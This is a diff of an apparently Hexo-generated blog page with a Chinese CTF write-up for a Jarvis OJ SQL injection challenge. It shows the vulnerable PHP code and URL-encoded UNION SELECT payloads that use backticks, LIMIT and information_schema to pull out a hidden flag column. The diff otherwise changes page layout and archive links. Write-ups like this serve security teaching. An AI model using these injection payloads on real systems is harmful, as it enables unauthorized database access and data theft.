@@ -405,15 +405,24 @@ height:50vh;
     <article class="article-entry">
         <p><a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p>
 <h3 id="得到源码"><a href="#得到源码" class="headerlink" title="得到源码"></a>得到源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    $table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    $table = Filter($table);</span><br><span class="line">    mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    $sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    $ret = sql_query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>?table=flag 正常响应<br>==&gt; <strong>存在 secret_flag 表</strong><br>注意到这个反引号 ``，其作用是区分 MySQL 保留字与普通字符</p>
-<p>本地尝试<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">desc</span>  <span class="comment"># 报错</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`desc`</span>  <span class="comment"># 能成功执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> <span class="string">`abc`</span> <span class="string">`def`</span></span><br><span class="line"><span class="keyword">desc</span> abc <span class="keyword">def</span> </span><br><span class="line"><span class="comment"># 效果是一样的</span></span><br></pre></td></tr></table></figure></p>
+<p>本地尝试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">desc</span>  <span class="comment"># 报错</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`desc`</span>  <span class="comment"># 能成功执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> <span class="string">`abc`</span> <span class="string">`def`</span></span><br><span class="line"><span class="keyword">desc</span> abc <span class="keyword">def</span> </span><br><span class="line"><span class="comment"># 效果是一样的</span></span><br></pre></td></tr></table></figure>
+
 <p>结合题目 ==&gt; desc `secret_flag` `<br>（注意空格，此处如果是 desc `secret_flag`` 将被认为是执行 desc secret_flag`）</p>
-<p>顺手执行<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span></span><br></pre></td></tr></table></figure></p>
-<p>发现还是没有变化，依旧显示 flag{xxx}<br>不要灰心，这只显示了一条数据而已，加入 limit 试试<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>顺手执行</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span></span><br></pre></td></tr></table></figure>
+
+<p>发现还是没有变化，依旧显示 flag{xxx}<br>不要灰心，这只显示了一条数据而已，加入 limit 试试</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
 <p>==&gt; 1</p>
 <h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`%<span class="number">20</span>`%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span></span><br><span class="line">where%<span class="number">20</span>table_name=<span class="number">0x7365637265745f666c6167</span>%<span class="number">20</span>limit%<span class="number">201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
 <p> ==&gt; flagUwillNeverKnow<br>(如果 <code>“</code> 被过滤，此处 table_name 的值要进行 hex 编码）</p>
 <h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>flagUwillNeverKnow<span class="symbol">%20</span>from<span class="symbol">%20</span>secret_flag<span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
 <blockquote>
 <p>PS：也可以不用 limit，直接 where 0，使得前面的查询为空，则直接显示我们的数据<br>table=flag<code>%20</code>%20where%200%20union%20select%20flagUwillNeverKnow%20from%20secret_flag</p>
 </blockquote>
@@ -995,9 +1004,57 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 30
+        Total : 34
         </div>
         <!-- search  -->
         
@@ -1010,6 +1067,26 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/SSRF-Tips/">SSRF Tips</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化/">phar 与反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入绕过总结/">命令注入总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1177,23 +1254,29 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
-        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
     
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
